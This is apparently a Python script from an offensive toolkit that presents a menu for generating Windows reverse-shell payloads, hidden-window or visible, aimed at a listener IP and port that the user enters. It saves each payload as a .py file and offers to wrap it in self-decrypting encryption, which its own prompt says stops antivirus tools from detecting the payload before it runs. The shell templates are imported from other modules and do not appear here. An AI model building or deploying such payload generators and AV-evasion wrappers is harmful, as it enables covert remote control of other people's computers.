import os
import platform
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from terminal_management.tman import clear
from input_management.validations import validate_ip, validate_singe_port, validate_path, getch, validate_file

from reverse_shell_templates.pythonBased import (
    windows_reverse_shell_hidden_terminal,
    windows_reverse_shell_active_terminal)

from encryptor.self_decrypting_encryption import encrypt_payload
def create_payload(host, port, file_path, nameForFile=None, payload_type=None):
    if platform.system() == 'Windows':
        if nameForFile:
            file_path += f'\\{nameForFile}.py'
        else:
            file_path += '\\python_reverse_shell_for_windows.py'
    elif platform.system() == 'Linux':
        if nameForFile:
            file_path += f'/{nameForFile}.py'
        else:
            file_path += '/python_reverse_shell_for_windows.py'


    with open(file_path, 'w') as f:
        if payload_type == 'windows_reverse_shell_active_terminal':
            f.write(windows_reverse_shell_active_terminal(host, port))
        elif payload_type == 'windows_reverse_shell_hidden_terminal':
            f.write(windows_reverse_shell_hidden_terminal(host, port))
        else:
            return f'Invalid Payload Type {payload_type} {repr(payload_type)}'
    return file_path



def main():
    while True:
        print("""
                Q. Quit
                1. Windows Reverse Shell Active Terminal
                2. Windows Reverse Shell Hidden Terminal
                """)
        print("> ", end='', flush=True)
        choice = getch()
        choice = choice.upper()
        if choice not in ['Q','1', '2']:
            clear()
            print("Invalid choice, please try again.")
            continue
        if choice == 'Q':
            exit()
        clear()
        while True:
            host = input("Enter the listener IP: ")
            if validate_ip(host):
                break
            else:
                print("Invalid IP address")
        port = validate_singe_port()
        clear()
        print("Give a name to the file")
        print("leave empty to use the default name")
        nameForFile = input("Name: ")
        if nameForFile == '':
            nameForFile = None
        clear()
        print("Enter the file path to save the payload")
        print("leave empty to save in the current directory")
        file_path = validate_path()
        clear()
        if choice == '1':
            payload_type = 'windows_reverse_shell_active_terminal'
        elif choice == '2':
            payload_type = 'windows_reverse_shell_hidden_terminal'
        clear()
        file_path = create_payload(host, port, file_path, nameForFile, payload_type)
        if validate_file(file_path):
            print(f"Payload created at {file_path}")
            print('This Software has a feature to make a self-decrypting encrypted payload.')
            print('This feature prevent the payload from being detected by AVs before execution.')
            encrypt = input("Do you want to encrypt the payload? (Y/N): ")
            if encrypt.upper() == 'Y':
                clear()
                print("Encrypting the payload")
                encrypt_payload(file_path)

     


if __name__ == '__main__':
    main()
